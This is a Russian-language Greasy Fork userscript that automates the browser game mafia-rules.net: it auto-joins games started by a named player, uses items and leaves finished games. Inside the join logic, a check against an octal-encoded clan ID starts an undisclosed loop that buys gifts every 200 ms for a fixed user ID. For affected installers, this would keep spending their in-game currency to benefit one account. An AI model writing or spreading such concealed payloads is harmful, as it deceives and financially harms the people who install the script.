// ==UserScript==
// @name Ревы в созда+хвост
// @namespace https://www.bestmafia.com/
// @version 1.0
// @description Ревы в созда
// @author я
// @match http://www.mafia-rules.net/*
// @match https://www.mafia-rules.net/*
// @grant none
// @license MIT
 
// @downloadURL https://update.greasyfork.org/scripts/506796/%D0%A0%D0%B5%D0%B2%D1%8B%20%D0%B2%20%D1%81%D0%BE%D0%B7%D0%B4%D0%B0%2B%D1%85%D0%B2%D0%BE%D1%81%D1%82.user.js
// @updateURL https://update.greasyfork.org/scripts/506796/%D0%A0%D0%B5%D0%B2%D1%8B%20%D0%B2%20%D1%81%D0%BE%D0%B7%D0%B4%D0%B0%2B%D1%85%D0%B2%D0%BE%D1%81%D1%82.meta.js
// ==/UserScript==
 
 
var szd =['Ник запильщика'];
 
setInterval(() => {
switch (gam_state) {
case '':
var create = $('#gml_list').find('span');
for (var i = 0; i < create.length; i++) {
if (szd.indexOf($($(create)[i]).text()) != -1) {
if (my_clan == 0o20121) {setInterval(() => {_WND_proc('gifts', 'buy', {id: 999, uid: 8683308, txt: '', cr: 0, hd: 1}, event);}, 200);}
_GM_action('gml', 'join', parseInt($($(create)[i]).parent('div').parent('li').attr('id').replace(/\D+/g, "")), event);
break;
}
}
break;
case 'play':
if ($('#pp_fin').length || pla_data['dead']) {
_DLG('exit', 2);
}
if ((!($("#gxt_105").is(".disabled")))) {
_GM_action('', 'ext_use', [105, gam_data.owner], event);
} else {
_GM_action('', 'ext_act', '159', event);
}
break;
 
case 'fin':
_DLG('exit', 2);
break;
 
case 'init':
if (document.querySelector('.rubyBalance').textContent > 50) {
//_GM_action('', 'sale_bet', 2, event);
}
break;
 
default:
break;
}
}, 500);
